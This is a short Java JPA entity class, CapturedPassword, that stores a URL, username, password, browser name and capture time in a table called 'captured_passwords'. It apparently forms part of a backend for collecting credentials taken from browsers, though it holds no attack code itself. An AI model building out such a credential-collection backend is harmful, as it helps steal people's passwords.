package com.site.backend.entity;

import jakarta.persistence.*;
import lombok.Data;
import java.time.LocalDateTime;

@Entity
@Table(name = "captured_passwords")
@Data
public class CapturedPassword {
    
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String url;
    private String username;
    private String password;
    private String browser;
    
    @Column(name = "captured_at")
    private LocalDateTime capturedAt;
}